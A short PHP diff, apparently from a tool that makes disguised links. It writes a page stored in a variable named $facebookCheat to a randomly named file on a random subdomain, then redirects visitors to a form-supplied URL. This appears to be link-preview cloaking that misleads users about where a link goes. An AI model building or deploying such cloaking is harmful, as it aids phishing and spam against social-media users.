@@ -114,9 +114,9 @@ if ($_POST["url"]) {
     // $pathname = substr(md5(microtime()), rand(0, 26), 500);
     $pathname = generateRandomString();
     $filePhp = $pathname . ".php";
-
+    $fileHtml = $pathname . ".php";
     $fphp = fopen($filePhp, 'w');
-    $fFakeLink = fopen($fakelink, 'w');
+    $fhtml = fopen($fileHtml, 'w');
 
     $title = $_POST['title'];
     $description = $_POST['description'];
@@ -181,12 +181,12 @@ if ($_POST["url"]) {
 </html>
 ';
 
-    fwrite($fFakeLink, $facebookCheat);
-    fclose($fFakeLink);
+    fwrite($fhtml, $facebookCheat);
+    fclose($fhtml);
 
     $fakeLink = $_POST['fake_link'];
     if (($_POST['fake_link']) == '') {
-        $fakeLink = 'http://' . $subs[array_rand($subs)] . '.' . $_SERVER['HTTP_HOST'] . '/' . $facebookCheat;
+        $fakeLink = 'http://' . $subs[array_rand($subs)] . '.' . $_SERVER['HTTP_HOST'] . '/' . $fileHtml;
     }
 
     $redirectUrl = addHttp($_POST['url']);
